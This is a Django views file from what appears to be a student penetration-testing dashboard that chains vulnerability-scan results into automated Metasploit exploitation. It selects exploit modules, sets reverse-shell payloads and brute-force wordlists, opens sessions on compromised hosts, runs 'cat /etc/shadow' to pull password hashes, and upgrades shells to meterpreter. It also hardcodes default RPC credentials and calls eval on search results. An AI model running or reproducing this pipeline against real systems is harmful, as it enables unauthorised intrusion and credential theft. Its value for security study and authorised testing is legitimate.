from nltk.corpus import stopwords
import GVM.GVM.gvm as gvm
import json
import random
import re
import subprocess
from django.shortcuts import render
from django.views import View
from django.contrib.auth.decorators import login_required
from django.shortcuts import render, get_object_or_404, redirect
from django.template import loader
from django.http import HttpResponse, JsonResponse, HttpResponseRedirect
from django import template
from pymetasploit3.msfrpc import MsfRpcClient
import xml.etree.ElementTree as ET
import time
import threading
import re
from collections import Counter
from Users.models import User
from .models import Exploit
from collections import Counter
from nltk.tokenize import word_tokenize
import nltk
from nltk.corpus import stopwords
import re
from Core.env import cve_lists, exploit_lists
# stop_words = set(stopwords.words('english'))
msf_user = 'msf'
msf_pass = 'msf'
msf_host = '127.0.0.1'
msf_port = 55552
# Khởi tạo đối tượng MsfRpcClient
client = MsfRpcClient(msf_pass, port=msf_port,
                      username=msf_user, server=msf_host)
host = "192.168.1.27"
port = "8888"
host_name = host+":"+port
# Create your views here.
def exploit(module, payload, rhost, rport, uri, lhost, lport,targetURI):
    subprocess.run(["python", "./Core/tools/send_data.py", host_name,
                   "start attack"], capture_output=True, text=True)
    console = client.consoles.console()
    console.read()
    console.write("use " + module)
    subprocess.run(["python3", "./Core/tools/send_data.py", host_name,
                   console.read()['data']], capture_output=True, text=True)

    
    if "vnc" not in module:
        console.write("set USER_FILE " + "/usr/share/wordlists/accounts/username.txt")
    console.write("set PASS_FILE " + "/usr/share/wordlists/accounts/password.txt")
    subprocess.run(["python3", "./Core/tools/send_data.py", host_name, console.read()['data']], capture_output=True,
                text=True)
    time.sleep(1)
    if payload != None:
        console.write("set payload " + payload)
        subprocess.run(["python3", "./Core/tools/send_data.py", host_name, console.read()['data']], capture_output=True,
                   text=True)
    lhost = host
    if lhost != None:
        console.write("set lhost " + lhost)
        subprocess.run(["python3", "./Core/tools/send_data.py", host_name, console.read()['data']], capture_output=True,
                       text=True)
    if lport != None:
        console.write("set lport " + lport)
        subprocess.run(["python3", "./Core/tools/send_data.py", host_name, console.read()['data']], capture_output=True,
                       text=True)
    else:
        console.write("set lport " + str(random.randint(4000,8000)))
        subprocess.run(["python3", "./Core/tools/send_data.py", host_name, console.read()['data']], capture_output=True,
                       text=True)
    if uri is None:
        console.write("set rhost " + rhost)
        subprocess.run(["python3", "./Core/tools/send_data.py", host_name, console.read()['data']], capture_output=True,
                   text=True)
        if rport != None:
            console.write("set rport " + rport)
            subprocess.run(["python3", "./Core/tools/send_data.py", host_name, console.read()['data']], capture_output=True,
                           text=True)
    else:
        console.write("set uri " + uri)
        subprocess.run(["python3", "./Core/tools/send_data.py", host_name, console.read()['data']], capture_output=True,
                       text=True)
    console.write("set TARGETURI " + targetURI)
    subprocess.run(["python3", "./Core/tools/send_data.py", host_name, console.read()['data']], capture_output=True,
                    text=True)
    console.write("set STOP_ON_SUCCESS true")
    subprocess.run(["python3", "./Core/tools/send_data.py", host_name, console.read()['data']], capture_output=True,
                       text=True)
    timeout=time.time()+30
    console.write('exploit')
    while True:
        time.sleep(0.5)
        output = console.read()['data']
        print(output)
        if time.time() > timeout:
            break
        if output != "":
            timeout+=2
            print(output)
            subprocess.run(["python3", "./Core/tools/send_data.py", host_name, output], capture_output=True,
                           text=True)
        # if "complete" in output:
        #     console.write('save /home/copv/output/'+payload+rhost+'.txt')
        if "completed" in output:
            subprocess.run(["python", "./Core/tools/send_data.py", host_name, output], capture_output=True,
                           text=True)
            break
        if "Command shell session" in output:
            subprocess.run(["python3", "./Core/tools/send_data.py", host_name, output], capture_output=True,
                           text=True)
            break


def extract_keywords(text):
    words = nltk.word_tokenize(text)
    stop_words = set(stopwords.words('english'))
    keywords = [word for word in words if word.lower() not in stop_words]
   
    # Thêm vào đoạn mã này để bao gồm các từ như "dRuby" và "DRb"
    additional_keywords = re.findall(
        r'\b(?:[a-z]+[A-Z]|[A-Z]+[a-z])[a-zA-Z0-9]*\b', text)
    keywords+=additional_keywords
    if "VNC" in keywords: keywords.append("vnc_")
    keywords=[child for child in keywords if child.lower() in exploit_lists]
    
    return list(set(keywords))

def rank(key):
    if key=="excellent":
        return 1
    return 0

class Auto(View):
    def get(self, request, id1, **kwargs):
        host = request.get_host()
        username = request.user.username
        
        vuln = gvm.get_result(id=id1)
        
        et = ET.fromstring(vuln).find("result")
        name = et.find('name').text
        description = et.find('description').text
        port = et.find('port').text.split('/')[0]
        print(port)
        cve = None if et.find('nvt').find('refs') is None else et.find('nvt').find("refs").findall('ref')
        search_cve=[]
        if cve !=None:
            search_cve = [child.attrib['id'] for child in cve if child.attrib['type']=="cve"]

        cve_results =[]
        for child in search_cve:
            results = client.call('module.search', [child])
            results = [str(child) for child in results]
            cve_results.extend(results)
        counter = Counter(list(cve_results))
        cve_result = sorted(counter.items(), key=lambda x: x[1], reverse=True)
        cve_result = [eval(child[0]) for child in cve_result[0:5] if child[1]==cve_result[0][1]]
        cve_result=[{"name":child['name']+" : "+child["fullname"], "module":child["fullname"]}for child in cve_result][0:5]
        search_term = extract_keywords(name)+extract_keywords(description)
        search_term=list(set(search_term))
        print(search_term)
        search_results = []
        for child in search_term:
            results = client.call('module.search', [child])
            results = [str(child) for child in results]
            search_results.extend(results)
        counter = Counter(list(search_results))
        result = sorted(counter.items(), key=lambda x: x[1], reverse=True)
        # print(result[0])
        results = [eval(child[0]) for child in result[0:50] if child[1]==result[0][1]]
        exploits = [{"name":child['name']+" : "+child["fullname"], "module":child["fullname"]}for child in results][0:1]
        host = et.find('host').text
        targetURI=""
        try:
            targetURI=re.split(rf"{host}|port:",et.find('description').text)[-1].strip()
        except:
            pass
        if "/" not in targetURI:
            targetURI=""
        print(targetURI)
        exploits.insert(0,"")
        
        return render(request, "dashboard/auto.html", {"username": username, "exploits": exploits, 'host':host, 'name':name, "port" :port,"targetURI":targetURI})
    def post(self, request, **kwargs):
        host_name = request.get_host()

        host = request.POST['ip']
        module = request.POST['exploit']
        payload = request.POST['payload']
        rport = request.POST.get('rport', None)
        lhost = request.POST.get('lhost', None)
        lport = request.POST.get('lport', None)
        uri = request.POST.get('uri', None)
        targetURI=request.POST.get('targetURI', None)
        print("auto")
        # exploit(module=module, payload=payload,
        #                  rhost=host, rport=rport, uri=uri, lhost=lhost, lport=lport,targetURI=targetURI)
        threading.Thread(exploit(module=module, payload=payload,
                         rhost=host, rport=rport, uri=uri, lhost=lhost, lport=lport,targetURI=targetURI)).start()

        username = request.user.username
        exploits = client.modules.exploits
        exploits.insert(0, '')
        # return HttpResponse("hello")
        return render(request, "dashboard/index.html", {"username": username, "exploits": exploits})


class Main(View):
    def get(self, request, **kwargs):
        username = request.user.username
        module = Exploit.objects.all()
        exploits = client.call('module.search', [''])#client.modules.exploits
        exploits=[{"name":child['name']+" : "+child['fullname'], "module":child['fullname']}for child in exploits]
        exploits.insert(0, '')


        return render(request, "dashboard/index.html", {"username": username, "exploits": exploits})

    def post(self, request, **kwargs):
        host = request.get_host()
        host = request.POST['ip']
        module = request.POST['exploit']
        payload = request.POST['payload']
        rport = request.POST.get('rport', None)
        lhost = request.POST.get('lhost', None)
        lport = request.POST.get('lport', None)
        targetURI=request.POST.get('targetURI', None)
        uri = request.POST.get('uri', None)
        threading.Thread(target=exploit(module=module, payload=payload,
                         rhost=host, rport=rport, uri=uri, lhost=lhost, lport=lport,targetURI=targetURI)).start()

        username = request.user.username
        exploits = client.modules.exploits
        exploits.insert(0, '')
        # return HttpResponse("hello")
        return render(request, "dashboard/index.html", {"username": username, "exploits": exploits})


def run_session(session):
    cid = client.consoles.console().cid
    console = client.consoles.console(cid)
    st = threading.Thread(target=console.write("sessions -i " + str(session)))
    st.start()
    timeout = time.time() + 10
    while True:
        data = console.read()
        time.sleep(0.2)
        if "Invalid session identifier" in data['data']:
            return None, data['data'], None
        if time.time() > timeout:
            return None, "Time out", None
        if ("Starting interaction with") in data['data']:
            return console, data['data'], cid


consoles = []
for session in client.sessions.list:
    console, data, cid = run_session(session)
    consoles.append(console)


def run_command(console, cmd):
    console.write(cmd)
    timeout = time.time() + 2
    while True:
        time.sleep(0.1)
        output = console.read()
        if output['data'] != "":
            print(output)
            return output
        if time.time() > timeout:
            return output


def console():
    return client.consoles.console()

class ReportMetasploit(View):
    def get(self, request):
        tree = ET.parse('Core/report/report.xml')
        root = tree.getroot()
        hosts = root.find("hosts").findall('host')
        reponse = [{"name": child.find('name').text, "os_name": child.find('os-name').text, "os_family": child.find('os-family').text,
                    "detected_arch":  child.find('detected-arch').text, "address": child.find('address').text,
                    "vulns": [{"id": x.find("id").text, "created_at": x.find("created-at").text, "updated_at": x.find("updated-at").text,
                            "name": x.find("name").text, "info": x.find("info").text,
                            "refs": [ref.text for ref in x.find("refs").findall("ref")],
                            } for x in child.find('vulns')
                            ]
                    } for child in hosts]
        print(reponse)
        return render(request, "dashboard/reports.html", {"reponse":reponse})
    def post(self, request):
        console1 = console()
        run_command(console=console1, cmd="db_export -f xml -a /home/copv/Documents/final-project/Opra/Core/report/report.xml")
        return redirect('/opra/report_metasploit/')

class ReportMetasploitByIp(View):
    def get(self, request, ip):
        tree = ET.parse('Core/report/report.xml')
        root = tree.getroot()
        hosts = root.find("hosts").findall('host')
        reponse = [{"name": child.find('name').text, "os_name": child.find('os-name').text, "os_family": child.find('os-family').text,
                    "detected_arch":  child.find('detected-arch').text, "address": child.find('address').text,
                    "vulns": [{"id": x.find("id").text, "created_at": x.find("created-at").text, "updated_at": x.find("updated-at").text,
                            "name": x.find("name").text, "info": x.find("info").text,
                            "refs": [ref.text for ref in x.find("refs").findall("ref")],
                            } for x in child.find('vulns')
                            ]
                    } for child in hosts if child.find('address').text ==ip]
        print(reponse)
        return render(request, "dashboard/report.html", {"reponse":reponse})
    
class LoadSessions(View):
    def get(self, request):
        # threading.Thread(target=exploit(module='exploit/linux/misc/drb_remote_codeexec', payload="cmd/unix/reverse_python", rhost="192.168.1.25",rport=None, lport=None, lhost=None, uri=None)).run()
        sessions = {"sessions": client.sessions.list}
        # sessions = {"sessions": [{'name':"name", 'host':"127.0.0.1"},{'host':"1.1.1.1"}]}
        # sessions={"id":100}
        return JsonResponse(sessions)


class LoadPayloads(View):
    def get(self, request):
        payloads = {}
        return JsonResponse(payloads)


class LoadSessionId(View):
    manufacturer ="cat /sys/class/dmi/id/chassis_vendor"
    product_name="cat /sys/class/dmi/id/product_name"
    version="cat /sys/class/dmi/id/bios_version"
    serial_number="cat /sys/class/dmi/id/product_serial"
    hostname="hostname"
    operating_system="""hostnamectl | grep "Operating System" | cut -d ' ' -f3-"""
    processor_name="awk -F':' '/^model name/ {print $2}' /proc/cpuinfo | uniq | sed -e 's/^[ \t]*//'"
    memory="""dmidecode -t 17 | grep "Size" | awk '{s+=$2} {b=$3} END {print s b}"""
    passwd = """cat /etc/shadow"""
    def byte_to_json(self, output):
        try:
            return json.loads(output.decode('utf8'))
        except:
            return b"{}"
            raise

    def get(self, request, id):

        ip=None
        session=None
        network = []
        system = {}
        passwd=""
        try:
            ip = client.sessions.list[str(id)]['session_host']
            session = client.sessions.list[str(id)]
            console, data, cid = run_session(int(id))
            data = run_command(console, "ip addr")['data']
            network = re.split(r'\n[0-9]:', data)
            manufacturer = run_command(console, self.manufacturer)['data']
            product_name = run_command(console, self.product_name)['data']
            version = run_command(console, self.version)['data']
            serial_number = run_command(console, self.serial_number)['data']
            hostname = run_command(console, self.hostname)['data']
            operating_system = run_command(console, self.operating_system)['data']
            processor_name = run_command(console, self.processor_name)['data']
            memory = "4096"#run_command(console, self.memory)['data']
            passwd = run_command(console, self.passwd)['data']

            print("data",manufacturer,product_name,version,serial_number,hostname,operating_system,processor_name,memory)
            # system = run_command(console, self.system_info)
            # system = system['data'].split('\n')[-1]

            system = '{"manufacturer":"%s","product_name":"%s","version":"%s","serial_number":"%s","hostname":"%s","operating_system":"%s","processor_name":"%s","memory":"%s"}'%(manufacturer.rstrip(),product_name.rstrip(),version.rstrip(),serial_number.rstrip(),hostname.rstrip(),operating_system.rstrip(),processor_name.rstrip(),memory.rstrip())
            print(system)
            console.write("background")
            console.write("y")
            console.read()

            system = json.loads(system)
            # console.write("background")
            # console.write("y")
            # console.read()
            # del console
        except Exception as e:
            print('error')
            print(e)
            pass

        # # get_system_info = Info.connection_bash_execute(file=self.system_info, ip=ip)
        # get_disk_info = Info.connection_ssh_execute(command="lsblk --json", ip=ip)
        # get_network_info = Info.connection_ssh_execute(command="ip --json address", ip=ip)
        # get_systemctl = Info.connection_ssh_execute(
        #     command="systemctl list-units --type=service --state=active -o json", ip=ip)
        #
        # # get_system_info_json = self.byte_to_json(get_system_info)
        # get_system_disk_json = self.byte_to_json(get_disk_info)
        # get_system_network_json = self.byte_to_json(get_network_info)
        # get_systemctl_list_json = self.byte_to_json(get_systemctl)

        return render(request, 'client/clientinfo.html', {'id': id, 'ip': ip, 'system_network': network, 'client_info': system, 'session': session, 'passwd': passwd})


class Msf(View):
    def get(self, request, id):
        ids = {'id': id}
        return render(request, 'dashboard/msf.html', ids)


class Module(View):
    def get(self, request):
        module = request.GET['module']
        print(module)
        if "exploit" in module:
            required=client.modules.use('exploit', module).required
            payloads = client.modules.use('exploit', module).payloads
            payloads = {'payloads': payloads,'required':required}
            return JsonResponse(payloads)
        return HttpResponse(status="404")


class Message(View):
    def get(self, request):
        return render(request, 'dashboard/message.html')


class Meterpreter(View):
    def get(self, request, id):
        console = client.consoles.console()
        console.read()
        console.write("use post/multi/manage/shell_to_meterpreter")
        time.sleep(0.5)
        console.write("set SESSION "+str(id))
        console.write("run")
        time.sleep(5)
        print(console.read())
        return HttpResponseRedirect("/opra/")


class Info(View):
    def get(self, request, ip):
        return JsonResponse({'ram': 0, 'cpu': 0, 'disk': 0})

    def post(self, request, ip):
        try:
            return JsonResponse(
                {'ram': random.randint(3, 9), 'cpu': random.randint(3, 9), 'disk': random.randint(3, 9)})
        except Exception as e:
            print(e)
            return JsonResponse({'ram': 0, 'cpu': 0, 'disk': 0})
